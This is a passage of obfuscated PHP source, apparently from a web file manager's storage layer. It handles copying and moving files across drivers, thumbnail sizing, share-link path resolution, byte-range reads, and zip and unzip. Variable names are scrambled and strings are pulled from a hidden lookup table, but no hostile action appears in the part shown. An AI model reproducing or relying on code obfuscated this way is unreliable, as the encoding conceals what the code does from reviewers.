(self::driverIsSame($¯Œ¯¯¸ƒ, $êööÉ—)) { if ($‚€ÎŸ‘İ) { $“€Î³ñÆ = $êööÉ—->moveFile($¬ú›èæ, $Š­†£§‚); } else { $“€Î³ñÆ = $êööÉ—->copyFile($¬ú›èæ, $Š­†£§‚); } Hook::trigger($ªî€»âö[1200], $¯Œ¯¯¸ƒ, $¬ú›èæ, $êööÉ—, $Š­†£§‚, $˜ŒÔ˜î°, $“€Î³ñÆ); self::copyMoveKeepInfo($¯Œ¯¯¸ƒ, $¬ú›èæ, $“€Î³ñÆ); return $“€Î³ñÆ; } $ˆÒÔ¦ø = TEMP_FILES; if ($GLOBALS[$ªî€»âö[6]][$ªî€»âö[99]][$ªî€»âö[836]]) { $ˆÒÔ¦ø = $GLOBALS[$ªî€»âö[6]][$ªî€»âö[99]][$ªî€»âö[836]]; } $ÌÌîÖ‡ = $ˆÒÔ¦ø; mk_dir($ÌÌîÖ‡); $€—Ï«İß = $ÌÌîÖ‡ . $·€èã±†; $ÚèİÍ­Ÿ = $€—Ï«İß; $€—Ï«İß = $¯Œ¯¯¸ƒ->download($¬ú›èæ, $€—Ï«İß); $€—Ï«İß = $¯Œ¯¯¸ƒ->iconvApp($€—Ï«İß); if (substr($€—Ï«İß, strlen($ˆÒÔ¦ø)) == $ˆÒÔ¦ø) { $‚€ÎŸ‘İ = !0; } $“€Î³ñÆ = $êööÉ—->upload($Š­†£§‚, $€—Ï«İß, $‚€ÎŸ‘İ); self::remove($ÚèİÍ­Ÿ); Hook::trigger($ªî€»âö[1200], $¯Œ¯¯¸ƒ, $¬ú›èæ, $êööÉ—, $Š­†£§‚, $˜ŒÔ˜î°, $“€Î³ñÆ); self::copyMoveKeepInfo($¯Œ¯¯¸ƒ, $¬ú›èæ, $“€Î³ñÆ); return $“€Î³ñÆ; } private static function copyMoveKeepInfo($ê¯à‡¯—, $šû»±§, $…Ş‚áš) { if (!$…Ş‚áš) { return; } $üä•°¾æ = $ê¯à‡¯—->info($šû»±§); if (!is_array($üä•°¾æ)) { return; } IO::setModifyTime($…Ş‚áš, $üä•°¾æ[$_SERVER[‚ûòÉ˜ş][95]]); } public static function pathFather($ĞìÌ©È) { $ß²±Ø§ = IO::init($ĞìÌ©È); $›úµÄÕ¯ = $ß²±Ø§->pathFather($ß²±Ø§->path); return $ß²±Ø§->getPathOuter($›úµÄÕ¯); } public static function fileOut($‘£‡¬à±, $öÇš—ÃÇ = false, $×ğè¼¸ = false, $ˆšø›ˆƒ = '') { $±¥®Åê€ = self::driverMake($‘£‡¬à±); if ($±¥®Åê€->isFileOutServer()) { return $±¥®Åê€->fileOutServer($‘£‡¬à±, $öÇš—ÃÇ, $×ğè¼¸, $ˆšø›ˆƒ); } return $±¥®Åê€->fileOut($‘£‡¬à±, $öÇš—ÃÇ, $×ğè¼¸, $ˆšø›ˆƒ); } public static function fileOutImage($Á’–ğïŒ, $‚ì”ò±Ô = 250) { $¥ºäÇç… = array(250, 600, 1200, 2000, 3000, 5000); for ($êûÀğ¦è = 0; $êûÀğ¦è < count($¥ºäÇç…); $êûÀğ¦è++) { if ($êûÀğ¦è == 0 && $‚ì”ò±Ô <= $¥ºäÇç…[$êûÀğ¦è]) { $‚ì”ò±Ô = $¥ºäÇç…[$êûÀğ¦è]; break; } else { if ($‚ì”ò±Ô > $¥ºäÇç…[$êûÀğ¦è - 1] && $‚ì”ò±Ô <= $¥ºäÇç…[$êûÀğ¦è]) { $‚ì”ò±Ô = $¥ºäÇç…[$êûÀğ¦è]; break; } else { if ($êûÀğ¦è == count($¥ºäÇç…) - 1 && $‚ì”ò±Ô > $¥ºäÇç…[$êûÀğ¦è]) { $‚ì”ò±Ô = $¥ºäÇç…[$êûÀğ¦è]; break; } } } } $œŞ¦ÃÚ£ = self::driverMake($Á’–ğïŒ); if ($œŞ¦ÃÚ£->isFileOutServer()) { return $œŞ¦ÃÚ£->fileOutImageServer($Á’–ğïŒ, $‚ì”ò±Ô); } return $œŞ¦ÃÚ£->fileOutImage($Á’–ğïŒ, $‚ì”ò±Ô); } private static function driverIsSame($Û÷œ€ºÚ, $ë½Óã) { $¶±°é´‚ =& $_SERVER[‚ûòÉ˜ş]; $À»Ï·•ƒ = $Û÷œ€ºÚ->getType(); $ç­œä• = $ë½Óã->getType(); if ($À»Ï·•ƒ != $ç­œä•) { return !1; } if ($À»Ï·•ƒ == $¶±°é´‚[797]) { return !0; } if ($À»Ï·•ƒ == $¶±°é´‚[116]) { return !0; } if ($Û÷œ€ºÚ->pathDriver == $ë½Óã->pathDriver) { return !0; } return !1; } public static function copyUpdate($Šö×Ñ ê, $äïéäòÄ) { $ÑØ¯Å†À =& $_SERVER[‚ûòÉ˜ş]; if (!IO::exist($Šö×Ñ ê)) { return !1; } if (!IO::exist($äïéäòÄ)) { IO::mkdir($äïéäòÄ); } $ûˆõÍë´ = array_to_keyvalue(self::listAllSimple($Šö×Ñ ê), $ÑØ¯Å†À[94]); $àß²‘¨à = array_to_keyvalue(self::listAllSimple($äïéäòÄ), $ÑØ¯Å†À[94]); $Şµ÷øÂµ = array(); $ŞíËËŠŞ = array(); foreach ($ûˆõÍë´ as $œÔ…Ú÷¨ => $—˜ôßÕ˜) { if (isset($àß²‘¨à[$œÔ…Ú÷¨])) { if ($—˜ôßÕ˜[$ÑØ¯Å†À[85]] == 1) { continue; } if ($àß²‘¨à[$œÔ…Ú÷¨][$ÑØ¯Å†À[86]] == $—˜ôßÕ˜[$ÑØ¯Å†À[86]]) { continue; } } if ($—˜ôßÕ˜[$ÑØ¯Å†À[85]] == 1) { $ŞíËËŠŞ[] = $äïéäòÄ . $ÑØ¯Å†À[8] . trim($œÔ…Ú÷¨, $ÑØ¯Å†À[8]); continue; } $³ì¯Ø³ü = strstr(trim($œÔ…Ú÷¨, $ÑØ¯Å†À[8]), $ÑØ¯Å†À[8]) ? get_path_father($œÔ…Ú÷¨) : $ÑØ¯Å†À[12]; $Şµ÷øÂµ[] = array($ÑØ¯Å†À[1201] => $—˜ôßÕ˜[$ÑØ¯Å†À[96]], $ÑØ¯Å†À[1202] => rtrim($äïéäòÄ, $ÑØ¯Å†À[8]) . $ÑØ¯Å†À[8] . $³ì¯Ø³ü, $ÑØ¯Å†À[1203] => $—˜ôßÕ˜); } $©ê©ÖÀí = array($ÑØ¯Å†À[224] => $Şµ÷øÂµ, $ÑØ¯Å†À[85] => $ŞíËËŠŞ); Hook::trigger($ÑØ¯Å†À[1204], $Šö×Ñ ê, $äïéäòÄ, $©ê©ÖÀí); foreach ($ŞíËËŠŞ as $—˜ôßÕ˜) { IO::mkdir($—˜ôßÕ˜); } foreach ($Şµ÷øÂµ as $—˜ôßÕ˜) { IO::copy($—˜ôßÕ˜[$ÑØ¯Å†À[1201]], $—˜ôßÕ˜[$ÑØ¯Å†À[1202]], REPEAT_REPLACE); } } public static function fileSubstr($´îÜ³ñ½, $¢öó»ˆë, $ ¦Åùû = false) { $ÓÍÀ…Â¤ =& $_SERVER[‚ûòÉ˜ş]; $ÜÚôæÊ‘ = self::driverMake($´îÜ³ñ½); $âÁû¡ãÀ = $ÜÚôæÊ‘->size($´îÜ³ñ½); $¨¶òàÍ… = $¢öó»ˆë; $Ë‡´Á‰¶ = $ ¦Åùû; if ($¢öó»ˆë < 0) { $¢öó»ˆë = $âÁû¡ãÀ + $¢öó»ˆë; } if ($ ¦Åùû === !1) { $ ¦Åùû = $âÁû¡ãÀ - $¢öó»ˆë; } if ($¢öó»ˆë + $ ¦Åùû > $âÁû¡ãÀ) { $ ¦Åùû = $âÁû¡ãÀ - $¢öó»ˆë; } if (!$âÁû¡ãÀ && $ÜÚôæÊ‘->getType() == $ÓÍÀ…Â¤[116] && !$ÜÚôæÊ‘->exist($´îÜ³ñ½)) { $‡¼÷­ê = get_path_this($´îÜ³ñ½); $¦ñäµ®£ = parse_url_query($‡¼÷­ê); if (is_array($¦ñäµ®£) && isset($¦ñäµ®£[$ÓÍÀ…Â¤[42]])) { $‡¼÷­ê = urldecode($¦ñäµ®£[$ÓÍÀ…Â¤[42]]); } throw new Exception($ÓÍÀ…Â¤[1205] . LNG($ÓÍÀ…Â¤[1206]) . $ÓÍÀ…Â¤[1007] . clear_html($‡¼÷­ê) . $ÓÍÀ…Â¤[12]); } if ($ ¦Åùû <= 0) { return $ÓÍÀ…Â¤[12]; } if ($¢öó»ˆë < 0 || $¢öó»ˆë >= $âÁû¡ãÀ || $ ¦Åùû > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\122\145\141\x64\x20\x65\162\162\157\162\x21\x20\x73\x74\x61\x72\164\x3d{$¢öó»ˆë}\73\x6c\145\156\x67\x74\x68\75{$ ¦Åùû}\x3b\x20\163\151\x7a\145\x3d{$âÁû¡ãÀ}\x3b"); } $ÓÆæàË = $ÜÚôæÊ‘->fileSubstr($´îÜ³ñ½, $¢öó»ˆë, $ ¦Åùû); if (!$ÓÆæàË && $ ¦Åùû && isset($GLOBALS[$ÓÍÀ…Â¤[1207]])) { throw new Exception($GLOBALS[$ÓÍÀ…Â¤[1207]][$ÓÍÀ…Â¤[1208]]); } return $ÓÆæàË; } private static function driverMake(&$œğ¦×Á™) { $¢Ü¯ùŒê =& $_SERVER[‚ûòÉ˜ş]; $İÍ˜ÅÏç = KodIO::parse($œğ¦×Á™); if (!self::$driverListSystem) { $½œ¢„¡ = Model($¢Ü¯ùŒê[807])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($½œ¢„¡, $¢Ü¯ùŒê[451]); } if ($İÍ˜ÅÏç[$¢Ü¯ùŒê[43]] == KodIO::KOD_IO && !self::$driverListSystem[$İÍ˜ÅÏç[$¢Ü¯ùŒê[451]]]) { return !1; } $œğ¦×Á™ = $İÍ˜ÅÏç[$¢Ü¯ùŒê[1209]]; $çÕæÑİî = self::driverGet($İÍ˜ÅÏç, $œğ¦×Á™); return $çÕæÑİî; } private static function driverGet($†­Æ·È, &$¬­Â–Î‡) { $Ë½Ù”‚è =& $_SERVER[‚ûòÉ˜ş]; $şƒÇ¡Ö = $†­Æ·È[$Ë½Ù”‚è[1210]]; $ÀªÍãµŒ = $†­Æ·È[$Ë½Ù”‚è[451]]; switch ($†­Æ·È[$Ë½Ù”‚è[43]]) { case KodIO::KOD_IO: $’îÅóŠ = self::$driverListSystem[$ÀªÍãµŒ]; break; case KodIO::KOD_SOURCE: $¬­Â–Î‡ = $ÀªÍãµŒ . $¬­Â–Î‡; $’îÅóŠ = array($Ë½Ù”‚è[1211] => $Ë½Ù”‚è[1212], $Ë½Ù”‚è[6] => $†­Æ·È); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $»Ú£—î = $GLOBALS[$Ë½Ù”‚è[1213]]; self::$driverListUser = array_to_keyvalue($»Ú£—î, $Ë½Ù”‚è[451]); } $’îÅóŠ = self::$driverListUser[$ÀªÍãµŒ]; break; case KodIO::KOD_SHARE_LINK: $’îÅóŠ = array($Ë½Ù”‚è[1211] => $Ë½Ù”‚è[1214], $Ë½Ù”‚è[6] => $†­Æ·È); $àœ‹‘Ë™ = Action($Ë½Ù”‚è[1215])->sharePathInfo($†­Æ·È[$Ë½Ù”‚è[94]]); $¬­Â–Î‡ = $àœ‹‘Ë™[$Ë½Ù”‚è[191]]; if (!$àœ‹‘Ë™[$Ë½Ù”‚è[191]]) { $§“éÇØ” = Model($Ë½Ù”‚è[640])->getInfo($àœ‹‘Ë™[$Ë½Ù”‚è[641]]); $¬­Â–Î‡ = KodIO::clear($§“éÇØ”[$Ë½Ù”‚è[1216]] . $†­Æ·È[$Ë½Ù”‚è[1209]]); $†­Æ·È[$Ë½Ù”‚è[536]] = $§“éÇØ”; $†­Æ·È[$Ë½Ù”‚è[1192]] = $¬­Â–Î‡; $’îÅóŠ = array($Ë½Ù”‚è[1211] => $Ë½Ù”‚è[1217], $Ë½Ù”‚è[6] => $†­Æ·È); } break; case KodIO::KOD_SHARE_ITEM: $’îÅóŠ = array($Ë½Ù”‚è[1211] => $Ë½Ù”‚è[1218], $Ë½Ù”‚è[6] => $†­Æ·È); $§“éÇØ” = Model($Ë½Ù”‚è[640])->getInfo($†­Æ·È[$Ë½Ù”‚è[451]]); if ($§“éÇØ”[$Ë½Ù”‚è[191]] == $Ë½Ù”‚è[222]) { $¬­Â–Î‡ = KodIO::clear($§“éÇØ”[$Ë½Ù”‚è[1216]] . $†­Æ·È[$Ë½Ù”‚è[1209]]); $†­Æ·È[$Ë½Ù”‚è[536]] = $§“éÇØ”; $†­Æ·È[$Ë½Ù”‚è[1192]] = $¬­Â–Î‡; $’îÅóŠ = array($Ë½Ù”‚è[1211] => $Ë½Ù”‚è[1219], $Ë½Ù”‚è[6] => $†­Æ·È); } else { if (!$¬­Â–Î‡) { $¬­Â–Î‡ = $§“éÇØ”[$Ë½Ù”‚è[191]]; } } break; default: $¬­Â–Î‡ = $†­Æ·È[$Ë½Ù”‚è[94]]; $’îÅóŠ = array($Ë½Ù”‚è[1211] => $Ë½Ù”‚è[1220]); break; } $•—šêé = $†­Æ·È[$Ë½Ù”‚è[94]]; if (!isset(self::$driverCache[$•—šêé])) { $É˜üƒÆ• = strtolower($’îÅóŠ[$Ë½Ù”‚è[105]]); $âú©Ú—² = $GLOBALS[$Ë½Ù”‚è[6]][$Ë½Ù”‚è[99]][$Ë½Ù”‚è[866]]; $é¶ÏùˆÔ = $Ë½Ù”‚è[84] . (isset($âú©Ú—²[$É˜üƒÆ•]) ? $âú©Ú—²[$É˜üƒÆ•] : ucfirst($É˜üƒÆ•)); if (!class_exists($é¶ÏùˆÔ)) { show_json("{$é¶ÏùˆÔ}\40\x6e\x6f\164\x20\x65\x78\x69\163\x74\x73\41", !1); } $à«ÖÌ±ú = isset($’îÅóŠ[$Ë½Ù”‚è[6]]) ? $’îÅóŠ[$Ë½Ù”‚è[6]] : !1; self::$driverCache[$•—šêé] = new $é¶ÏùˆÔ($à«ÖÌ±ú); } $ê®¬Í»ì = self::$driverCache[$•—šêé]; $ê®¬Í»ì->pathDriver = $şƒÇ¡Ö; $ê®¬Í»ì->pathBase = $Ë½Ù”‚è[12]; if (isset($’îÅóŠ[$Ë½Ù”‚è[6]][$Ë½Ù”‚è[1221]])) { $ê®¬Í»ì->pathBase = rtrim($’îÅóŠ[$Ë½Ù”‚è[6]][$Ë½Ù”‚è[1221]], $Ë½Ù”‚è[8]) . $Ë½Ù”‚è[8]; $¬­Â–Î‡ = $ê®¬Í»ì->pathBase . ltrim($¬­Â–Î‡, $Ë½Ù”‚è[8]); } $¬­Â–Î‡ = $ê®¬Í»ì->getPath($¬­Â–Î‡); if (isset($†­Æ·È[$Ë½Ù”‚è[1192]])) { $¬­Â–Î‡ = $†­Æ·È[$Ë½Ù”‚è[1192]]; } $ê®¬Í»ì->path = $¬­Â–Î‡; return $ê®¬Í»ì; } public static function errorTips($®ğà¶È· = false) { $¡âÔŒ‘¼ =& $_SERVER[‚ûòÉ˜ş]; static $½°»ÆÕ = array(); $Œ·Û¦ú = 1000; if ($®ğà¶È· === -1) { return $½°»ÆÕ ? $½°»ÆÕ[count($½°»ÆÕ) - 1] : $¡âÔŒ‘¼[12]; } if ($®ğà¶È· === !1) { return implode($¡âÔŒ‘¼[18], $½°»ÆÕ); } if (count($½°»ÆÕ) >= $Œ·Û¦ú) { $½°»ÆÕ = array_slice($½°»ÆÕ, $Œ·Û¦ú * 0.5, $Œ·Û¦ú); } $½°»ÆÕ[] = $®ğà¶È·; write_log($¡âÔŒ‘¼[173] . ACTION . $¡âÔŒ‘¼[1222] . $®ğà¶È·, $¡âÔŒ‘¼[1223]); } public static function getLastError($²÷²™ Š = '') { $˜Šİ‚£ = self::errorTips(-1); return $˜Šİ‚£ ? $˜Šİ‚£ : $²÷²™ Š; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $§Ûæ”ß–; if ($§Ûæ”ß–) { return $§Ûæ”ß–; } $ĞÎÅğÌÃ = IO::init($_SERVER[‚ûòÉ˜ş][8]); return $ĞÎÅğÌÃ; } private static function iconvSystem($Œúëóûã) { return self::local()->iconvSystem($Œúëóûã); } private static function iconvApp($úûÏÅ›Ş) { return self::local()->iconvApp($úûÏÅ›Ş); } public static function zipFolder($øü¥Ñ¾§, $™ÑËñ«³ = "\172\151\x70", $Óå¾ã°ª = '', $¿¯‹Ê²é = REPEAT_RENAME) { $‰ÅËğµ =& $_SERVER[‚ûòÉ˜ş]; $¬œĞ³ûé = IO::listPath($øü¥Ñ¾§); if (!$¬œĞ³ûé) { return !1; } $¬œĞ³ûé = array_merge($¬œĞ³ûé[$‰ÅËğµ[92]], $¬œĞ³ûé[$‰ÅËğµ[93]]); return self::zip($¬œĞ³ûé, $™ÑËñ«³, $Óå¾ã°ª, $¿¯‹Ê²é); } public static function zip($¡€Ñ—¬, $ŞâİÈ = "\x7a\x69\x70", $†º™Ìó¿ = '', $Şµğäìó = REPEAT_RENAME) { $øäÊæ¦– =& $_SERVER[‚ûòÉ˜ş]; if (is_string($¡€Ñ—¬) && $¡€Ñ—¬) { $¡€Ñ—¬ = array(array($øäÊæ¦–[94] => $¡€Ñ—¬)); } $ÂÍÄ´Ù = self::init($¡€Ñ—¬[0][$øäÊæ¦–[94]]); $õåÕú‚Õ = self::info($¡€Ñ—¬[0][$øäÊæ¦–[94]]); $Ì™§²ÆØ = $øäÊæ¦–[12]; $Èö¦ŞñÂ = $øäÊæ¦–[12]; $Äıæíƒµ = $øäÊæ¦–[12]; if ($†º™Ìó¿ && substr($†º™Ìó¿, -1, 1) != $øäÊæ¦–[8]) { $Èö¦ŞñÂ = get_path_father($†º™Ìó¿); $Äıæíƒµ = get_path_this($†º™Ìó¿); } else { $Èö¦ŞñÂ = self::pathFather($õåÕú‚Õ[$øäÊæ¦–[94]]); $Äıæíƒµ = $õåÕú‚Õ[$øäÊæ¦–[42]] . $øäÊæ¦–[10] . $ŞâİÈ; if (count($¡€Ñ—¬) > 1) { $á¨™ª– = IO::info($Èö¦ŞñÂ); $Äıæíƒµ = $á¨™ª–[$øäÊæ¦–[42]] . $øäÊæ¦–[10] . $ŞâİÈ; } if ($†º™Ìó¿) { $Èö¦ŞñÂ = $†º™Ìó¿; } } if ($ÂÍÄ´Ù->getType() == $øäÊæ¦–[116]) { $âæ‰”Æ = self::init($Èö¦ŞñÂ); $¿ÁÊ¨­É = $âæ‰”Æ->getType() == $øäÊæ¦–[116] ? $Èö¦ŞñÂ : get_path_father($ÂÍÄ´Ù->path); $¿ÁÊ¨­É = rtrim($¿ÁÊ¨­É, $øäÊæ¦–[8]) . $øäÊæ¦–[8]; mk_dir($¿ÁÊ¨­É); } else { $Ì™§²ÆØ = TEMP_FILES . $øäÊæ¦–[1224] . time() . rand_string(8) . $øäÊæ¦–[8]; mk_dir($Ì™§²ÆØ); file_put_contents($Ì™§²ÆØ . $øäÊæ¦–[1225], $øäÊæ¦–[12]); $¿ÁÊ¨­É = $Ì™§²ÆØ; } $æí½«Öú = IO::info($¿ÁÊ¨­É); if (!$æí½«Öú || !$æí½«Öú[$øäÊæ¦–[227]]) { show_json(LNG($øäÊæ¦–[1226]), !1); } $Ó¶ÆŠóõ = self::zipFileList($¡€Ñ—¬, $Ì™§²ÆØ); foreach ($Ó¶ÆŠóõ as $‡Ç°Â½Á => $É“£ºüè) { $Ó¶ÆŠóõ[$‡Ç°Â½Á] = self::iconvSystem($É“£ºüè); } $´«Ç˜½ = get_filename_auto($¿ÁÊ¨­É . $Äıæíƒµ, $øäÊæ¦–[12], $Şµğäìó); KodArchive::create(self::iconvSystem($´«Ç˜½), $Ó¶ÆŠóõ); if (!IO::exist($´«Ç˜½)) { if ($Ì™§²ÆØ) { del_dir($Ì™§²ÆØ); } show_json(LNG($øäÊæ¦–[1227]), !1); } if (!$Ì™§²ÆØ) { return $´«Ç˜½; } $ûÌíîİ¾ = self::move($´«Ç˜½, $Èö¦ŞñÂ, $Şµğäìó); if ($Ì™§²ÆØ) { del_dir($Ì™§²ÆØ); } if (!$´«Ç˜½) { show_json(LNG($øäÊæ¦–[1227]), !1); } return $ûÌíîİ¾; } public static function unzip($ıÆ¼¬ÆÏ, $ÍÉÊ„›², $òã˜…ë± = "\x2d\x31", $˜ßÂ»òœ = "\x72\145\x70\x6c\x61\143\x65") { $Ûû÷·çø =& $_SERVER[‚ûòÉ˜ş]; $„÷éºÆÇ = parent::info($ıÆ¼¬ÆÏ); if (!$„÷éºÆÇ) { show_json(LNG($Ûû÷·çø[1228]), !1); } $Öãùñï— = IO::infoFullSimple($ÍÉÊ„›²); if (!$Öãùñï—) { $ÍÉÊ„›² = IO::mkdir($ÍÉÊ„›²); } if (isset($Öãùñï—[$Ûû÷·çø[191]]) && trim($Öãùñï—[$Ûû÷·çø[94]], $Ûû÷·çø[8]) != trim($ÍÉÊ„›², $Ûû÷·çø[8])) { $ —‰ï¤á = KodIO::make($Öãùñï—[$Ûû÷·çø[190]]); $ßÜúÏ¶‚ = IO::fileNameAuto($ —‰ï¤á, $Öãùñï—[$Ûû÷·çø[42]], REPEAT_RENAME_FOLDER, !0); $ÍÉÊ„›² = IO::mkdir($ —‰ï¤á . $ßÜúÏ¶‚); } $òã˜…ë± = $òã˜…ë± && $òã˜…ë± != $Ûû÷·çø[1229] ? @json_decode($òã˜…ë±, !0) : -1; $ùİºÍ™Ë = self::unzipPart($ıÆ¼¬ÆÏ, $òã˜…ë±); if (!$ùİºÍ™Ë || !IO::exist($ùİºÍ™Ë[$Ûû÷·çø[224]])) { show_json(LNG($Ûû÷·çø[115]), !1); } $¿¼›äú› = $ùİºÍ™Ë[$Ûû÷·çø[1230]][count($ùİºÍ™Ë[$Ûû÷·çø[1230]]) - 1]; if ($¿¼›äú›[$Ûû÷·çø[1231]] == -1 || substr($¿¼›äú›[$Ûû÷·çø[42]], -1, 1) == $Ûû÷·çø[8]) { $€Ë©§É± = $ùİºÍ™Ë[$Ûû÷·çø[1232]] . rand_string(10) . $Ûû÷·çø[8]; mk_dir($€Ë©§É±); $„Ì¿îŞŞ = count($ùİºÍ™Ë[$Ûû÷·çø[1230]]) == 1 ? IO::ext($ıÆ¼¬ÆÏ) : get_path_ext($ùİºÍ™Ë[$Ûû÷·çø[224]]); $çÇ”¡ = KodArchive::extract(self::iconvSystem($ùİºÍ™Ë[$Ûû÷·çø[224]]), $€Ë©§É±, $¿¼›äú›[$Ûû÷·çø[1231]], $ßÜúÏ¶‚, $„Ì¿îŞŞ); self::unzipErrorCheck($çÇ”¡, array($Ûû÷·çø[1233], $ıÆ¼¬ÆÏ, $„Ì¿îŞŞ, $ÍÉÊ„›², $ùİºÍ™Ë)); Hook::trigger($Ûû÷·çø[1234], $€Ë©§É±); recursion_dir($€Ë©§É±, $å€¯“ˆ, $ï¨°êÍÖ, 0); $ëšÁ¨èú = array_merge($å€¯“ˆ, $ï¨°êÍÖ); $Ñ­ÌÊÓÒ = array(); foreach ($ëšÁ¨èú as $ğØèÜ·ñ) { $‹«Ï•ïÔ = IO::move(self::iconvApp($ğØèÜ·ñ), $ÍÉÊ„›², $˜ßÂ»òœ); if ($‹«Ï•ïÔ) { $Ñ­ÌÊÓÒ[] = $‹«Ï•ïÔ; } } del_dir($€Ë©§É±); } else { $‹«Ï•ïÔ = IO::move($ùİºÍ™Ë[$Ûû÷·çø[224]], $ÍÉÊ„›², $˜ßÂ»òœ, get_path_this($¿¼›äú›[$Ûû÷·çø[42]])); if ($‹«Ï•ïÔ) { $Ñ­ÌÊÓÒ[] = $‹«Ï•ïÔ; } } return $Ñ­ÌÊÓÒ ? $Ñ­ÌÊÓÒ : !1; } public static function unzipList($”‰çòË) { $©Ñ‡î =& $_SERVER[‚ûòÉ˜ş]; $ª­˜®¤ğ = isset($”‰çòË[$©Ñ‡î[1235]]) ? $”‰çòË[$©Ñ‡î[1235]] : !1; $±ïó¹‘Ê = isset($”‰çòË[$©Ñ‡î[1231]]) ? @json_decode($”‰çòË[$©Ñ‡î[1231]], !0) : -1; $½µ”›—õ = self::unzipPart($”‰çòË[$©Ñ‡î[94]], $±ïó¹‘Ê); if (!$½µ”›—õ || !IO::exist($½µ”›—õ[$©Ñ‡î[224]])) { show_json(LNG($©Ñ‡î[115]), !1); } $£€´ñÊÉ = $½µ”›—õ[$©Ñ‡î[1230]][count($½µ”›—õ[$©Ñ‡î[1230]]) - 1]; $ş–ì = in_array(IO::ext($½µ”›—õ[$©Ñ‡î[224]]), array($©Ñ‡î[366], $©Ñ‡î[1236], $©Ñ‡î[1237], $©Ñ‡î[1238], $©Ñ‡î[1239], $©Ñ‡î[1240])); if (!$ª­˜®¤ğ && ($£€´ñÊÉ[$©Ñ‡î[1231]] == -1 || $ş–ì)) { $œºí¯ëš = $½µ”›—õ[$©Ñ‡î[1232]] . get_path_this($½µ”›—õ[$©Ñ‡î[224]]) . $©Ñ‡î[1241]; if (!IO::exist($œºí¯ëš)) { $™°ŠíîØ = $£€´ñÊÉ[$©Ñ‡î[1231]] == -1 ? get_path_ext(IO::pathThis($”‰çòË[$©Ñ‡î[94]])) : get_path_ext($½µ”›—õ[$©Ñ‡î[224]]); $ü„ÒÒ­É = KodArchive::listContent(self::iconvSystem($½µ”›—õ[$©Ñ‡î[224]]), !0, $™°ŠíîØ); self::unzipErrorCheck($ü„ÒÒ­É, array($©Ñ‡î[1242], $”‰çòË, $½µ”›—õ)); @file_put_contents($œºí¯ëš, json_encode($ü„ÒÒ­É[$©Ñ‡î[1243]])); } return @json_decode(IO::getContent($œºí¯ëš), !0); } IO::fileOut($½µ”›—õ[$©Ñ‡î[224]], $ª­˜®¤ğ, get_path_this($£€´ñÊÉ[$©Ñ‡î[42]])); die; } private static function zipFileList($Û‚™åÛ, $Ÿ×ÜÏüÜ = false) { $Õ‡íÖµÅ =& $_SERVER[‚ûòÉ˜ş]; $¿ŒàûÜ‚ = array(); foreach ($Û‚™åÛ as $ÀØñ£“õ) { $¡ùª˜  = $ÀØñ£“õ[$Õ‡íÖµÅ[94]]; if ($Ÿ×ÜÏüÜ) { $¡ùª˜  = self::copy($ÀØñ£“õ[$Õ‡íÖµÅ[94]], $Ÿ×ÜÏüÜ, $Õ‡íÖµÅ[858]); } else { $ÛùÊÅ¤ = self::init($ÀØñ£“õ[$Õ‡íÖµÅ[94]]); if ($ÛùÊÅ¤->getType() == $Õ‡íÖµÅ[116]) { $¡ùª˜  = $ÛùÊÅ¤->path; } } if ($¡ùª˜  && self::local()->exist($¡ùª˜ )) { $¿ŒàûÜ‚[$ÀØñ£“õ[$Õ‡íÖµÅ[94]]] = $¡ùª˜ ; } } if (!empty($¿ŒàûÜ‚)) { return array_values($¿ŒàûÜ‚); } show_json(LNG($Õ‡íÖµÅ[1206]), !1); } private static function localFilePath($âµØÊç) { $ÂòÏÌşô =& $_SERVER[‚ûòÉ˜ş]; $ÕÔ²èß = KodIO::parse($âµØÊç); if ($ÕÔ²èß[$ÂòÏÌşô[43]] == KodIO::KOD_SOURCE) { $¹ÑÎÂŒ† = Model($ÂòÏÌşô[865])->fileInfoGet(KodIO::sourceID($âµØÊç)); if (!$¹ÑÎÂŒ†[$ÂòÏÌşô[94]]) { show_json($ÂòÏÌşô[1244], !1); } $âµØÊç = $¹ÑÎÂŒ†[$ÂòÏÌşô[94]]; } $–ÛŒ’­‚ = self::init($âµØÊç); if ($–ÛŒ’­‚->pathParse[$ÂòÏÌşô[1192]]) { $âµØÊç = $–ÛŒ’­‚->pathParse[$ÂòÏÌşô[1192]]; $–ÛŒ’­‚ = self::init($âµØÊç); } $¸£ûë¸Ù = $–ÛŒ’­‚->getType(); if ($¸£ûë¸Ù == $ÂòÏÌşô[116] || $¸£ûë¸Ù == $ÂòÏÌşô[1245]) { if (!$–ÛŒ’­‚->exist($–ÛŒ’­‚->path)) { show_json(LNG($ÂòÏÌşô[115]), !1); } return $–ÛŒ’­‚->path; } return !1; } public static function unzipPart($ñ¤îéïç, $Ô¤¿ˆÛ¬ = -1) { $—ªä¸ªí =& $_SERVER[‚ûòÉ˜ş]; $é«ëş¥š = IO::pathThis($ñ¤îéïç); if (!$Ô¤¿ˆÛ¬ || $Ô¤¿ˆÛ¬ == -1) { $‘‹‰çİ = array(array($—ªä¸ªí[42] => $é«ëş¥š, $—ªä¸ªí[1231] => -1)); $‘‹‰çİ[0][$—ªä¸ªí[1246]] = $‘‹‰çİ[0][$—ªä¸ªí[42]]; } else { if (is_array($Ô¤¿ˆÛ¬)) { $‘‹‰çİ = $Ô¤¿ˆÛ¬; $¶¸Å°› = count($‘‹‰çİ) - 1; for ($—’Â—×¹ = 0; $—’Â—×¹ <= $¶¸Å°›; $—’Â—×¹++) { $Áì§éÚ³ = $‘‹‰çİ[$—’Â—×¹]; $øªöæñ° = get_path_this($Áì§éÚ³[$—ªä¸ªí[42]]) . (checkExtSafe($Áì§éÚ³[$—ªä¸ªí[42]]) ? $—ªä¸ªí[12] : $—ªä¸ªí[1247]); $‘‹‰çİ[$—’Â—×¹][$—ªä¸ªí[1246]] = $—ªä¸ªí[1248] . intval($Áì§éÚ³[$—ªä¸ªí[1231]]) . $—ªä¸ªí[438] . $øªöæñ°; if ($—’Â—×¹ == 0) { continue; } $‘‹‰çİ[$—’Â—×¹][$—ªä¸ªí[1246]] = $‘‹‰çİ[$—’Â—×¹ - 1][$—ªä¸ªí[1246]] . $—ªä¸ªí[1249] . $‘‹‰çİ[$—’Â—×¹][$—ªä¸ªí[1246]]; } } } if (!is_array($‘‹‰çİ) || count($‘‹‰çİ) == 0) { return !1; } $›ú˜‹¼Í = $‘‹‰çİ[count($‘‹‰çİ) - 1]; if (!IO::exist($ñ¤îéïç)) { return !1; } $¿ƒúëèÃ = TEMP_FILES . $—ªä¸ªí[1250] 